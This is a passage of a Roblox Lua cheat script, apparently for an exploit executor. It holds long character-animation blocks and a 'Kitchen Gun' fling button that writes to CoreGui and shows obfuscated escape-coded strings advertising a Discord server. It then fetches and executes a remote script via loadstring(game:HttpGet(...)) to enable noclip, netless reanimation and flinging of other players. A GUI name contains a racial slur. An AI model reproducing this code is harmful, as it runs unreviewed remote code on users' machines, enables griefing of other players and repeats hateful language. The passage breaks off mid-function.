						tors["Right Shoulder"].C0 = tors["Right Shoulder"].C0:Lerp(rs * CF(-6.3627958297729e-06,-1.2814998626709e-06,0) * CFA(math.rad(-5.0888874903416e-14),math.rad(0),math.rad(-16.666590480558)) * CFA(math.rad(math.random(-5,5)),math.rad(math.random(-5,5)),math.rad(math.random(-5,5))),LerpStyle(0.3*1,Enum.EasingStyle.Linear,Enum.EasingDirection.InOut))
						tors["Left Shoulder"].C0 = tors["Left Shoulder"].C0:Lerp(ls * CF(-3.6135315895081e-07,-6.8545341491699e-07,-1.0192394256592e-05) * CFA(math.rad(-5.1894108186278),math.rad(1.288664597311e-05),math.rad(-6.5913370278506)) * CFA(math.rad(math.random(-5,5)),math.rad(math.random(-5,5)),math.rad(math.random(-5,5))),LerpStyle(0.3*1,Enum.EasingStyle.Linear,Enum.EasingDirection.InOut))
						tors["Right Hip"].C0 = tors["Right Hip"].C0:Lerp(rh * CF(0.42104256153107,0.034831158816814,0.17949678003788) * CFA(math.rad(-0.61160128510086),math.rad(-12.918175833866),math.rad(-13.875242430936)) * CFA(math.rad(math.random(-5,5)),math.rad(math.random(-5,5)),math.rad(math.random(-5,5))),LerpStyle(0.4*1,Enum.EasingStyle.Linear,Enum.EasingDirection.InOut))
						tors["Left Hip"].C0 = tors["Left Hip"].C0:Lerp(lh * CF(0.044,0.168,-0.018) * CFA(math.rad(-3.062),math.rad(10.748),math.rad(16.004)),LerpStyle(0.4*1,Enum.EasingStyle.Linear,Enum.EasingDirection.InOut))
					elseif Anim == "Walking" then
						neck.C1 = neck.C1:Lerp(nek * CF(0,0,0) * CFA(0,0,0),LerpStyle(0.2,Enum.EasingStyle.Quad,Enum.EasingDirection.InOut))
						RootPart.RootJoint.C0 = RootPart.RootJoint.C0:Lerp(root * CF(math.sin(time()*1.2/2)*0.5,0,1.5699999332428 + math.sin(time()*1.2)*0.8) * CFA(math.rad(20),0,0),LerpStyle(0.4*1,Enum.EasingStyle.Linear,Enum.EasingDirection.InOut))
						tors["Right Shoulder"].C0 = tors["Right Shoulder"].C0:Lerp(rs * CF(0.18456310033798,0.072837918996811,0.025131464004517) * CFA(math.rad(0),math.rad(0),math.rad(-90 + 20)),LerpStyle(0.3*1,Enum.EasingStyle.Linear,Enum.EasingDirection.InOut))
						tors["Left Shoulder"].C0 = tors["Left Shoulder"].C0:Lerp(ls * CF(-2.1855694143369e-08,-1.1324882507324e-06,4.7683715820313e-07) * CFA(math.rad(-10.555062715957),0,math.rad(5.0888871870203e-14)),LerpStyle(0.3*1,Enum.EasingStyle.Linear,Enum.EasingDirection.InOut))
						tors["Right Hip"].C0 = tors["Right Hip"].C0:Lerp(rh * CF(0.53557544946671,0.51078402996063,0.20069018006325) * CFA(math.rad(-0.61152860761922),math.rad(-12.917748947043),math.rad(-13.874821520528)),LerpStyle(0.4*1,Enum.EasingStyle.Linear,Enum.EasingDirection.InOut))
						tors["Left Hip"].C0 = tors["Left Hip"].C0:Lerp(lh * CF(0.044364839792252,0.16831062734127,-0.01743184030056) * CFA(math.rad(-3.0618461657566),math.rad(10.748240102479),math.rad(16.00414238579)),LerpStyle(0.4*1,Enum.EasingStyle.Linear,Enum.EasingDirection.InOut))
					end
				else
					if Mode == 3 then
						if Anim == "Idle" then
							neck.C1 = neck.C1:Lerp(nek * CF(1.9371509552002e-07,1.5929341316223e-05,-4.202127456665e-06) * CFA(math.rad(21.739728854511),math.rad(5.1041854257117),math.rad(-1.2887171043902)),LerpStyle(0.3,Enum.EasingStyle.Quad,Enum.EasingDirection.InOut))
							RootPart.RootJoint.C0 = RootPart.RootJoint.C0:Lerp(root * CF(0,0,1.5699999332428 + math.sin(time()*1.2)*0.8) * CFA(math.rad(-20.38645493652    + math.cos(time()*1.2)*12),math.rad(0),math.rad(0)),LerpStyle(0.4*1,Enum.EasingStyle.Linear,Enum.EasingDirection.InOut))
							tors["Right Shoulder"].C0 = tors["Right Shoulder"].C0:Lerp(rs * CF(-0.32815232872963,0.1005739197135,-0.23984776437283) * CFA(math.rad(0.84963295078898),math.rad(-88.110417010216),math.rad(-111.04976443205)),LerpStyle(0.3*1,Enum.EasingStyle.Linear,Enum.EasingDirection.InOut))
							tors["Left Shoulder"].C0 = tors["Left Shoulder"].C0:Lerp(ls * CF(4.9620866775513e-06,4.5299530029297e-06,0) * CFA(math.rad(-2.0577425455945e-09),math.rad(-2.0355549961367e-13),math.rad(-26.585131646062)),LerpStyle(0.3*1,Enum.EasingStyle.Linear,Enum.EasingDirection.InOut))
							tors["Right Hip"].C0 = tors["Right Hip"].C0:Lerp(rh * CF(0.2229138314724,0.51010847091675,0.055625528097153) * CFA(math.rad(0.0069767951951584),math.rad(-13.999476741749),math.rad(0.028834607411614 + -math.cos(time()*1.2)*12)),LerpStyle(0.4*1,Enum.EasingStyle.Linear,Enum.EasingDirection.InOut))
							tors["Left Hip"].C0 = tors["Left Hip"].C0:Lerp(lh * CF(5.185604095459e-06,5.9604644775391e-08,0) * CFA(math.rad(-2.0565212125969e-09),math.rad(1.0177774980683e-12),math.rad(32.873929286609 + math.cos(time()*1.2)*7)),LerpStyle(0.4*1,Enum.EasingStyle.Linear,Enum.EasingDirection.InOut))
						elseif Anim == "Walking" then
							neck.C1 = neck.C1:Lerp(nek * CF(1.9371509552002e-07,1.5929341316223e-05,-4.202127456665e-06) * CFA(math.rad(-21.739728854511),math.rad(5.1041854257117),math.rad(-1.2887171043902)),LerpStyle(0.3,Enum.EasingStyle.Quad,Enum.EasingDirection.InOut))
							RootPart.RootJoint.C0 = RootPart.RootJoint.C0:Lerp(root * CF(0,0,1.5699999332428 + math.sin(time()*1.2)*0.8) * CFA(math.rad(36.242),math.rad(0),math.rad(0)),LerpStyle(0.4*1,Enum.EasingStyle.Linear,Enum.EasingDirection.InOut))
							tors["Right Shoulder"].C0 = tors["Right Shoulder"].C0:Lerp(rs * CF(-0.32815232872963,0.1005739197135,-0.23984776437283) * CFA(math.rad(0.84963295078898),math.rad(-88.110417010216),math.rad(-111.04976443205)),LerpStyle(0.3*1,Enum.EasingStyle.Linear,Enum.EasingDirection.InOut))
							tors["Left Shoulder"].C0 = tors["Left Shoulder"].C0:Lerp(ls * CF(4.4852495193481e-06,3.0398368835449e-06,0) * CFA(math.rad(-2.0593709895914e-09),math.rad(-1.0177774980683e-12),math.rad(14.6189868523)),LerpStyle(0.3*1,Enum.EasingStyle.Linear,Enum.EasingDirection.InOut))
							tors["Right Hip"].C0 = tors["Right Hip"].C0:Lerp(rh * CF(0.2229138314724,0.51010847091675,0.055625528097153) * CFA(math.rad(0.0069767951951584),math.rad(-13.999476741749),math.rad(0.028834607411614)),LerpStyle(0.4*1,Enum.EasingStyle.Linear,Enum.EasingDirection.InOut))
							tors["Left Hip"].C0 = tors["Left Hip"].C0:Lerp(lh * CF(5.185604095459e-06,5.9604644775391e-08,0) * CFA(math.rad(-2.0565212125969e-09),math.rad(1.0177774980683e-12),math.rad(32.873929286609)),LerpStyle(0.4*1,Enum.EasingStyle.Linear,Enum.EasingDirection.InOut))
						end
					else
						if Mode == 4 then
							if Anim == "Idle" then
								neck.C1 = neck.C1:Lerp(nek * CF(4.3585896492004e-07,-8.9406967163086e-08,1.7881393432617e-06) * CFA(math.rad(39.417513473764),math.rad(5.6097065092046),math.rad(-6.4341165784185e-07)) * CFA(math.rad(math.random(-5,5)),math.rad(math.random(-5,5)),math.rad(math.random(-5,5))),LerpStyle(0.3,Enum.EasingStyle.Quad,Enum.EasingDirection.InOut))
								RootPart.RootJoint.C0 = RootPart.RootJoint.C0:Lerp(root * CF(0,0,0) * CFA(math.rad(5.6512229603009),math.rad(0),math.rad(0)) * CFA(math.rad(math.random(-5,5)),math.rad(math.random(-5,5)),math.rad(math.random(-5,5))),LerpStyle(0.4*1,Enum.EasingStyle.Linear,Enum.EasingDirection.InOut))
								tors["Right Shoulder"].C0 = tors["Right Shoulder"].C0:Lerp(rs * CF(0.13210447132587,0.41776725649834,-0.040189050137997) * CFA(math.rad(-5.4107068133021),math.rad(0.27662138072505),math.rad(162.52787567807)) * CFA(math.rad(math.random(-5,5)),math.rad(math.random(-5,5)),math.rad(math.random(-5,5))),LerpStyle(0.3*1,Enum.EasingStyle.Linear,Enum.EasingDirection.InOut))
								tors["Left Shoulder"].C0 = tors["Left Shoulder"].C0:Lerp(ls * CF(-3.0398368835449e-06,-1.4901161193848e-06,5.9306621551514e-06) * CFA(math.rad(-30.621701728554),math.rad(-22.074372265348),math.rad(-147.58799800082)) * CFA(math.rad(math.random(-5,5)),math.rad(math.random(-5,5)),math.rad(math.random(-5,5))),LerpStyle(0.3*1,Enum.EasingStyle.Linear,Enum.EasingDirection.InOut))
								tors["Right Hip"].C0 = tors["Right Hip"].C0:Lerp(rh * CF(0.008,-0.048963367938995,0.0046971440315247) * CFA(math.rad(-0.11773319802313),math.rad(-5.1092051878649),math.rad(10.75064518284)) * CFA(math.rad(math.random(-5,5)),math.rad(math.random(-5,5)),math.rad(math.random(-5,5))),LerpStyle(0.4*1,Enum.EasingStyle.Linear,Enum.EasingDirection.InOut))
								tors["Left Hip"].C0 = tors["Left Hip"].C0:Lerp(lh * CF(2.7194619178772e-07,3.5762786865234e-06,6.1094760894775e-06) * CFA(math.rad(-2.4099323571224),math.rad(3.6670713625455),math.rad(3.2326800825126)) * CFA(math.rad(math.random(-5,5)),math.rad(math.random(-5,5)),math.rad(math.random(-5,5))),LerpStyle(0.4*1,Enum.EasingStyle.Linear,Enum.EasingDirection.InOut))
							elseif Anim == "Walking" then
								local W1 = game.Players.LocalPlayer.Character.Humanoid.MoveDirection* RootPart.CFrame.LookVector
								local W2 = game.Players.LocalPlayer.Character.Humanoid.MoveDirection* RootPart.CFrame.RightVector
								WVA = W1.X+W1.Z
								RLV = W2.X+W2.Z
								RLA =  CFrame.new((math.sin((time()*8))/1)*0.5 *WVA,0.3*(1-WVA),(math.sin((time()*8))/1)*0.5 *RLV) * CFrame.Angles((-math.sin((time()*8))/1.5)*RLV,0,(math.sin((time()*8))/1.2)*WVA)
								LLA =  CFrame.new((math.sin((time()*8))/1)*0.5 *WVA,0.3*(1-WVA),(math.sin((time()*8))/1)*0.5 *RLV) * CFrame.Angles((-math.sin((time()*8))/1.5)*RLV,0,(math.sin((time()*8))/1.2)*WVA)
								neck.C1 = neck.C1:Lerp(nek * CF(0,0,0) * CFA(math.rad(7),math.clamp(math.cos((time()*8))*0.2 + math.rad(-RootPart.RotVelocity.Y*8),math.rad(-85),math.rad(85)),math.rad(-RootPart.RotVelocity.Y*0.4)),LerpStyle(0.4,Enum.EasingStyle.Linear,Enum.EasingDirection.InOut))
								RootPart.RootJoint.C0 = RootPart.RootJoint.C0:Lerp(root *CF(0,-math.sin((time()*8*2))/3.2,-math.sin((time()*8*2))/3) * CFA(math.rad( -15 + 10 + WVA*15) + -math.rad(math.sin(time() *(8*2))*10),math.clamp( math.rad(0) - -RootPart.RotVelocity.Y/50,math.rad(-20),math.rad(20)),math.cos((time()*8))*0.2),LerpStyle(0.4,Enum.EasingStyle.Back,Enum.EasingDirection.InOut))
								tors["Right Shoulder"].C0 = tors["Right Shoulder"].C0:Lerp(rs * CF(0.13210447132587,0.41776725649834,-0.040189050137997) * CFA(math.rad(-5.4107068133021),math.rad(0.27662138072505),math.rad(162.52787567807)) * CFA(math.rad(math.random(-5,5)),math.rad(math.random(-5,5)),math.rad(math.random(-5,5))),LerpStyle(0.3*1,Enum.EasingStyle.Linear,Enum.EasingDirection.InOut))
								tors["Left Shoulder"].C0 = tors["Left Shoulder"].C0:Lerp(ls * CF(-math.sin((time()*8))/4.5,0,0) * CFA(math.rad(-5),-math.sin((time()*8))*0.1 + math.rad(RootPart.RotVelocity.Y*3),-math.sin((time()*8))*0.4),LerpStyle(0.4,Enum.EasingStyle.Back,Enum.EasingDirection.InOut))
								tors["Right Hip"].C0 = tors["Right Hip"].C0:Lerp(rh * CF(0,(math.cos((time()*8))/8),0) * RLA * CFA(0, (-math.sin((time()*8))*0.5)*WVA,math.rad( -15 + 10 + WVA*15) + -math.rad(math.sin(time() *(8*2))*10)),LerpStyle(0.2,Enum.EasingStyle.Linear,Enum.EasingDirection.InOut))
								tors["Left Hip"].C0 = tors["Left Hip"].C0:Lerp(lh * CF(0,(-math.cos((time()*8))/8),0) * LLA * CFA(0, (-math.sin((time()*8))*0.5)*WVA,-math.rad( -15 + 10 + WVA*15) + math.rad(math.sin(time() *(8*2))*10)),LerpStyle(0.2,Enum.EasingStyle.Linear,Enum.EasingDirection.InOut))
							end
						else
							if Mode == 5 then
								if Anim == "Idle" then
									neck.C1 = neck.C1:Lerp(nek * CF(0,0,0) * CFA(0,0,0),LerpStyle(0.2,Enum.EasingStyle.Quad,Enum.EasingDirection.InOut))
									RootPart.RootJoint.C0 = RootPart.RootJoint.C0:Lerp(root * CF(0,0,2 + math.sin(time()*2*2)*-1) * CFA(math.rad(0),math.rad(-math.cos(time()*2)*15),math.rad(0)),LerpStyle(0.1,Enum.EasingStyle.Linear,Enum.EasingDirection.InOut))
									tors["Right Shoulder"].C0 = tors["Right Shoulder"].C0:Lerp(rs * CF(0,0,0)* CFA(0,0,math.rad(164)),LerpStyle(0.1,Enum.EasingStyle.Linear,Enum.EasingDirection.InOut))
									tors["Left Shoulder"].C0 = tors["Left Shoulder"].C0:Lerp(CF(-1.47, 0.6, -0.6, 0.912067652, 0.362882406, -0.190915868, -0.355184585, 0.931834042, 0.0743479878, 0.204881638, 0, 0.978786826) * CFA(math.rad(math.cos(time()/4.7)*-7),0,math.rad(math.cos(time()/4.7)*-9)),LerpStyle(0.1,Enum.EasingStyle.Linear,Enum.EasingDirection.InOut))
									tors["Right Hip"].C0 = tors["Right Hip"].C0:Lerp(CF(0.522206306, -0.54, -0.526346207, 0.969920754, 0.0320315659, -0.24130398, 0.0948186889, 0.863288462, 0.495719284, 0.224194244, -0.503687918, 0.834286153) * CFA(math.rad(math.cos(time()/4.7)*13),0,math.rad(math.cos(time()/4.7)*6)) ,LerpStyle(0.1,Enum.EasingStyle.Linear,Enum.EasingDirection.InOut))
									tors["Left Hip"].C0 = tors["Left Hip"].C0:Lerp(CF(-0.62, -0.67, -0.270240784, 0.936621964, -0.0217529312, 0.349670023, -0.0813026801, 0.957330644, 0.277331024, -0.340782106, -0.288183689, 0.894884527) * CFA(-math.rad(math.cos(time()/4.7)*4),0,math.rad(math.cos(time()/4.7)*9)),LerpStyle(0.1,Enum.EasingStyle.Linear,Enum.EasingDirection.InOut))
								else
									neck.C1 = neck.C1:Lerp(nek * CF(0,0,0) * CFA(0,0,0),LerpStyle(0.2,Enum.EasingStyle.Quad,Enum.EasingDirection.InOut))
									RootPart.RootJoint.C0 = RootPart.RootJoint.C0:Lerp(root * CF(math.sin(time()*2)*-1.7,0,2 + math.sin(time()*2*2)*-1) * CFA(math.rad(20),math.rad(math.sin(time()*2)*15),math.rad(0)),LerpStyle(0.1,Enum.EasingStyle.Linear,Enum.EasingDirection.InOut))
									tors["Right Shoulder"].C0 = tors["Right Shoulder"].C0:Lerp(rs * CF(0,0,0) * CFA(math.rad(0),math.rad(0),math.rad(-70)),LerpStyle(0.1,Enum.EasingStyle.Linear,Enum.EasingDirection.InOut))
									tors["Left Shoulder"].C0 = tors["Left Shoulder"].C0:Lerp(ls * CF(0,0,0) * CFA(math.rad(-14),math.rad(0),math.rad(12)),LerpStyle(0.1,Enum.EasingStyle.Linear,Enum.EasingDirection.InOut))
									tors["Right Hip"].C0 = tors["Right Hip"].C0:Lerp(rh * CF(0.43,0.4,0.1) * CFA(0,math.rad(-16),math.rad(-12)),LerpStyle(0.5,Enum.EasingStyle.Back,Enum.EasingDirection.InOut))
									tors["Left Hip"].C0 = tors["Left Hip"].C0:Lerp(lh * CF(-0.45,0.41,0.13)  * CFA(0,math.rad(19),math.rad(24)),LerpStyle(0.5,Enum.EasingStyle.Back,Enum.EasingDirection.InOut))
								end
							else
								if Mode == 6 then
									if Anim == "Idle" then
										neck.C1 = neck.C1:Lerp(nek * CF(0,1,-0.5) * CFA(math.rad(0),math.rad(0),math.rad(0)),LerpStyle(0.3,Enum.EasingStyle.Quad,Enum.EasingDirection.InOut))
										RootPart.RootJoint.C0 = RootPart.RootJoint.C0:Lerp(root * CF(0,0,0) * CFA(math.rad(6.6123927935144+SusVISUALIZER),math.rad(0),math.rad(0)),LerpStyle(0.4*1,Enum.EasingStyle.Linear,Enum.EasingDirection.InOut))
										tors["Right Shoulder"].C0 = tors["Right Shoulder"].C0:Lerp(rs * CF(-1,0,-1) * CFA(math.rad(0),math.rad(0),math.rad(0)),LerpStyle(0.3*1,Enum.EasingStyle.Linear,Enum.EasingDirection.InOut))
										tors["Left Shoulder"].C0 = tors["Left Shoulder"].C0:Lerp(ls * CF(1,0,-1) * CFA(math.rad(0),math.rad(0),math.rad(0)),LerpStyle(0.3*1,Enum.EasingStyle.Linear,Enum.EasingDirection.InOut))
										tors["Right Hip"].C0 = tors["Right Hip"].C0:Lerp(rh * CF(-0.00052611529827118,0.0058164596557617,0.14987951517105) * CFA(math.rad(-2.2198240734154),math.rad(-0.19714184442755),math.rad(7.8304430532044+SusVISUALIZER)),LerpStyle(0.4*1,Enum.EasingStyle.Linear,Enum.EasingDirection.InOut))
										tors["Left Hip"].C0 = tors["Left Hip"].C0:Lerp(lh * CF(5.0812959671021e-06,0.0012486577033997,0.079992741346359) * CFA(math.rad(-1.9869835649399),math.rad(0.19068892982769),math.rad(-9.8769137238338-SusVISUALIZER)),LerpStyle(0.4*1,Enum.EasingStyle.Linear,Enum.EasingDirection.InOut))
									else
										neck.C1 = neck.C1:Lerp(nek * CF(0,1,-0.5) * CFA(math.rad(0),math.rad(0),math.rad(0)),LerpStyle(1,Enum.EasingStyle.Quad,Enum.EasingDirection.InOut))
										RootPart.RootJoint.C0 = RootPart.RootJoint.C0:Lerp(root * CF(0,0,0) * CFA(math.rad(6.6123927935144),math.rad(0),math.rad(0)),LerpStyle(1,Enum.EasingStyle.Linear,Enum.EasingDirection.InOut))
										tors["Right Shoulder"].C0 = tors["Right Shoulder"].C0:Lerp(rs * CF(-1,0,-1) * CFA(math.rad(0),math.rad(0),math.rad(0)),LerpStyle(1,Enum.EasingStyle.Linear,Enum.EasingDirection.InOut))
										tors["Left Shoulder"].C0 = tors["Left Shoulder"].C0:Lerp(ls * CF(1,0,-1) * CFA(math.rad(0),math.rad(0),math.rad(0)),LerpStyle(1,Enum.EasingStyle.Linear,Enum.EasingDirection.InOut))
										tors["Right Hip"].C0 = tors["Right Hip"].C0:Lerp(rh * CF(0,0,0) * CFA(math.rad(0),math.rad(0),math.rad(math.sin(time()*40)*90)),LerpStyle(1,Enum.EasingStyle.Linear,Enum.EasingDirection.InOut))
										tors["Left Hip"].C0 = tors["Left Hip"].C0:Lerp(lh * CF(0,0,0) * CFA(math.rad(0),math.rad(0),math.rad(math.sin(time()*40)*90)),LerpStyle(1,Enum.EasingStyle.Linear,Enum.EasingDirection.InOut))
									end
								end
							end
						end
					end

				end
			end
		end
	end

	--neck.C1 = neck.C1:Lerp(nek * CF(0,0,0) * CFA(math.rad(0),math.rad(0),math.rad(0)),LerpStyle(0.3,Enum.EasingStyle.Quad,Enum.EasingDirection.InOut))
	--RootPart.RootJoint.C0 = RootPart.RootJoint.C0:Lerp(root * CF(0,0,0) * CFA(math.rad(0),math.rad(0),math.rad(0)),LerpStyle(0.4*1,Enum.EasingStyle.Linear,Enum.EasingDirection.InOut))
	--tors["Right Shoulder"].C0 = tors["Right Shoulder"].C0:Lerp(rs * CF(0,0,0) * CFA(math.rad(0),math.rad(0),math.rad(0)),LerpStyle(0.3*1,Enum.EasingStyle.Linear,Enum.EasingDirection.InOut))
	--tors["Left Shoulder"].C0 = tors["Left Shoulder"].C0:Lerp(ls * CF(0,0,0) * CFA(math.rad(0),math.rad(0),math.rad(0)),LerpStyle(0.3*1,Enum.EasingStyle.Linear,Enum.EasingDirection.InOut))
	--tors["Right Hip"].C0 = tors["Right Hip"].C0:Lerp(rh * CF(0,0,0) * CFA(math.rad(0),math.rad(0),math.rad(0)),LerpStyle(0.4*1,Enum.EasingStyle.Linear,Enum.EasingDirection.InOut))
	--tors["Left Hip"].C0 = tors["Left Hip"].C0:Lerp(lh * CF(0,0,0) * CFA(math.rad(0),math.rad(0),math.rad(0)),LerpStyle(0.4*1,Enum.EasingStyle.Linear,Enum.EasingDirection.InOut))
end)
UICorner_33.Parent = Butterloaf

Kitchengun.Name = "Kitchengun"
Kitchengun.Parent = FlingScriptsFrame
Kitchengun.BackgroundColor3 = Color3.fromRGB(45, 70, 88)
Kitchengun.Position = UDim2.new(0.34251973, 0, 0.459440231, 0)
Kitchengun.Size = UDim2.new(0, 143, 0, 43)
Kitchengun.Font = Enum.Font.Nunito
Kitchengun.Text = "Kitchen Gun"
Kitchengun.TextColor3 = Color3.fromRGB(238, 238, 238)
Kitchengun.TextSize = 32.000
Kitchengun.MouseButton1Click:Connect(function()
	local skidlist = {
		HardHit1 = "rbxassetid://565207203",
		HardHit2 = "rbxassetid://541909913",
		HardHit3 = "rbxassetid://541909983",
		WeakHit1 = "rbxassetid://558642292",
		WeakHit2 = "rbxassetid://541907812",
		Slice1 = "rbxassetid://260429964",
		Slice2 = "rbxassetid://260430015",
		Explosion1 = "rbxassetid://138186576",
		Explosion2 = "rbxassetid://157878578",
		Woosh1 = "rbxassetid://541909867",
		Woosh2 = "rbxassetid://541909763",

	}
	local function CreateInstance(cls,props)
		local inst = Instance.new(cls)
		for i,v in pairs(props) do
			inst[i] = v
		end
		return inst
	end
	local soundlist = {
		HardHit1 = "rbxassetid://565207203",
		HardHit2 = "rbxassetid://541909913",
		HardHit3 = "rbxassetid://541909983",
		WeakHit1 = "rbxassetid://558642292",
		WeakHit2 = "rbxassetid://541907812",
		Slice1 = "rbxassetid://260429964",
		Slice2 = "rbxassetid://260430015",
		Explosion1 = "rbxassetid://138186576",
		Explosion2 = "rbxassetid://157878578",
		Woosh1 = "rbxassetid://541909867",
		Woosh2 = "rbxassetid://541909763",

	}

	local dontskid1 = {
		HardHit1 = "rbxassetid://565207203",
		HardHit2 = "rbxassetid://541909913",
		HardHit3 = "rbxassetid://541909983",
		WeakHit1 = "rbxassetid://558642292",
		WeakHit2 = "rbxassetid://541907812",
		Slice1 = "rbxassetid://260429964",
		Slice2 = "rbxassetid://260430015",
		Explosion1 = "rbxassetid://138186576",
		Explosion2 = "rbxassetid://157878578",
		Woosh1 = "rbxassetid://541909867",
		Woosh2 = "rbxassetid://541909763",

	}
	local gripwashere = {
		HardHit1 = "rbxassetid://565207203",
		HardHit2 = "rbxassetid://541909913",
		HardHit3 = "rbxassetid://541909983",
		WeakHit1 = "rbxassetid://558642292",
		WeakHit2 = "rbxassetid://541907812",
		Slice1 = "rbxassetid://260429964",
		Slice2 = "rbxassetid://260430015",
		Explosion1 = "rbxassetid://138186576",
		Explosion2 = "rbxassetid://157878578",
		Woosh1 = "rbxassetid://541909867",
		Woosh2 = "rbxassetid://541909763",

	}
	local hhynhywed = '\74\111\105\110\32\111\117\114\32\100\105\115\99\111\114\100\32\102\111\114\32\110\101\119\32\115\99\114\105\112\116\115\32\33\32\45\45\45\62\32\100\105\115\99\111\114\100\46\103\103\47\88\86\83\56\118\112\74\88\113\118\10'
	local chnhuew = '\83\99\114\105\112\116\32\99\111\110\118\101\114\116\101\100\32\98\121\32\103\114\105\112\32\97\110\100\32\117\109\117\116\99\97\110\100\10'
	local dontskidthisnigga = CreateInstance('ScreenGui',{DisplayOrder=0,Enabled=true,ResetOnSpawn=false,Name='dontskidthisnigga', Parent=game.CoreGui})
	local Frame = CreateInstance('Frame',{Style=Enum.FrameStyle.Custom,Active=false,AnchorPoint=Vector2.new(0, 0),BackgroundColor3=Color3.new(0.133333, 0.133333, 0.133333),BackgroundTransparency=0,BorderColor3=Color3.new(0.133333, 0.133333, 0.133333),BorderSizePixel=1,ClipsDescendants=false,Draggable=false,Position=UDim2.new(0.249297127, 0, 0.230303034, 0),Rotation=0,Selectable=false,Size=UDim2.new(0, 377, 0, 74),SizeConstraint=Enum.SizeConstraint.RelativeXY,Visible=true,ZIndex=1,Name = 'Frame',Parent = dontskidthisnigga })
	local TextLabel = CreateInstance('TextLabel',{Font=Enum.Font.SourceSans,FontSize=Enum.FontSize.Size14,Text=hhynhywed,TextColor3=Color3.new(1, 1, 1),TextScaled=false,TextSize=14,TextStrokeColor3=Color3.new(0, 0, 0),TextStrokeTransparency=1,TextTransparency=0,TextWrapped=false,TextXAlignment=Enum.TextXAlignment.Center,TextYAlignment=Enum.TextYAlignment.Center,Active=false,AnchorPoint=Vector2.new(0, 0),BackgroundColor3=Color3.new(0.133333, 0.133333, 0.133333),BackgroundTransparency=0,BorderColor3=Color3.new(0.133333, 0.133333, 0.133333),BorderSizePixel=1,ClipsDescendants=false,Draggable=false,Position=UDim2.new(0.00265251985, 0, -0.023808904, 0),Rotation=0,Selectable=false,Size=UDim2.new(0, 376, 0, 36),SizeConstraint=Enum.SizeConstraint.RelativeXY,Visible=true,ZIndex=1,Name='TextLabel',Parent = Frame})
	local TextLabel = CreateInstance('TextLabel',{Font=Enum.Font.SourceSans,FontSize=Enum.FontSize.Size14,Text=chnhuew,TextColor3=Color3.new(1, 1, 1),TextScaled=false,TextSize=14,TextStrokeColor3=Color3.new(0, 0, 0),TextStrokeTransparency=1,TextTransparency=0,TextWrapped=false,TextXAlignment=Enum.TextXAlignment.Center,TextYAlignment=Enum.TextYAlignment.Center,Active=false,AnchorPoint=Vector2.new(0, 0),BackgroundColor3=Color3.new(0.133333, 0.133333, 0.133333),BackgroundTransparency=0,BorderColor3=Color3.new(0.133333, 0.133333, 0.133333),BorderSizePixel=1,ClipsDescendants=false,Draggable=false,Position=UDim2.new(0.00265251985, 0, 0.508101106, 0),Rotation=0,Selectable=false,Size=UDim2.new(0, 376, 0, 36),SizeConstraint=Enum.SizeConstraint.RelativeXY,Visible=true,ZIndex=1,Name='TextLabel',Parent = Frame})
	wait(7)
	Frame.Visible = false

	if game.CoreGui.dontskidthisnigga  then
		_G.MiztReanimSettings = {
			PermanentDeath = true,
			NoHeadPermanentDeath = false,
			Noclip = true,
			HatReanimate = false,
			SemiHatReanimate = false,
			UseMizaruTorso = true,
			FlingActive = true,
			AlignMethod = true,
			Netless = true,
			ActiveLegacyNet = true,
			NetlessVelocity = {0,0,-50}
		}

		loadstring(game:HttpGet('https://raw.githubusercontent.com/Sylixe/Scripts/main/MiztReanimate.lua',true))()
		wait()
		local multiplier = 1 --Attack multiplier (default is 1)
		local soundlist = {
			HardHit1 = "rbxassetid://565207203",
			HardHit2 = "rbxassetid://541909913",
			HardHit3 = "rbxassetid://541909983",
			WeakHit1 = "rbxassetid://558642292",
			WeakHit2 = "rbxassetid://541907812",
			Slice1 = "rbxassetid://260429964",
			Slice2 = "rbxassetid://260430015",
			Explosion1 = "rbxassetid://138186576",
			Explosion2 = "rbxassetid://157878578",
			Woosh1 = "rbxassetid://541909867",
			Woosh2 = "rbxassetid://541909763",

		}

		local bgmusic = Instance.new("Sound")
		bgmusic.Volume = 3.5
		bgmusic.SoundId = "rbxassetid://877658690"
		bgmusic.Looped = true
		bgmusic.Parent = game:GetService('Players').LocalPlayer.Character.Torso
		bgmusic:Play()

		--[[Important Variables]]--
		local plr = game:GetService('Players').LocalPlayer
		local char = plr.Character.Dummy.Dummy
		local mouse = plr:GetMouse()
		local input = game:GetService('UserInputService')
		----
		local joints = {"Right Shoulder", "Left Shoulder", "Right Hip", "Left Hip", "Neck", "RootJoint"}
		local torso,head,rootpart = char.Torso,char.Head,char.HumanoidRootPart
		local rs = torso["Right Shoulder"]
		local ls = torso["Left Shoulder"]
		local rh = torso["Right Hip"]
		local lh = torso["Left Hip"]
		local neck = torso.Neck
		local rj = rootpart["RootJoint"]
		local humanoid = char:FindFirstChildOfClass("Humanoid")
		----
		local huge = Vector3.new(math.huge, math.huge, math.huge)
		local attacking = false
		local cananim = true
		local currentanim = "Idle"
		local mode = "Normal"

		--[[ Functions ]]--
		function addattack(keycode, func)
			if keycode ~= "MouseClick" then
				input.InputBegan:connect(function(inp)
					if inp.KeyCode == keycode and not input:GetFocusedTextBox() then
						func()
					end
				end)
			else
				mouse.Button1Down:connect(function()
					func()
				end)
			end
		end
		function attackend(keycode, func)
			input.InputEnded:connect(function(inp)
				if inp.KeyCode == keycode and not input:GetFocusedTextBox() then
					func()
				end
			end)
		end
		function swait(t)
			if t then
				for i = 0, t do
					game:GetService('RunService').Stepped:wait(0)
				end
			else
				game:GetService('RunService').Stepped:wait(0)
			end
			return true
		end
		function fade(obj, dest, grow)
			spawn(function()
				local oldcf = obj.CFrame
				for i = 0, 10 do
					if grow then
						obj.Size = obj.Size +Vector3.new(1,1,1)
						obj.CFrame = oldcf
					end
					obj.Transparency = obj.Transparency +0.1
					swait()
				end
				if dest then
					obj:Destroy()
				end
			end)
		end
		function replacejoint(name)
			local j = torso:FindFirstChild(name)
			if not j then j = char.HumanoidRootPart:FindFirstChild(name) end
			if j then
				if true then
					local already = j.Parent:FindFirstChild(j.Name.." Replacement")
					local new = Instance.new("Weld")
					local c0 = j.C0
					local c1 = j.C1
					new.Part0 = j.Part0
					j.Part0 = nil
					new.Name = j.Name.." Replacement"
					if already then c0 = already.C0 c1 = already.C1 already:Destroy() end
					new.Parent = j.Parent
					new.Part1 = j.Part1
					new.C0 = c0
					new.C1 = c1
					return new
				end
			end
		end
		function removejoint(name, fast)
			local j = torso:FindFirstChild(name.." Replacement")
			if not j then j = char.HumanoidRootPart:FindFirstChild(name.." Replacement") end
			if j then
				local p0 = j.Part0
				if p0 ~= nil then
					local c0 = j.C0
					local c1 = j.C1
					j:Destroy()
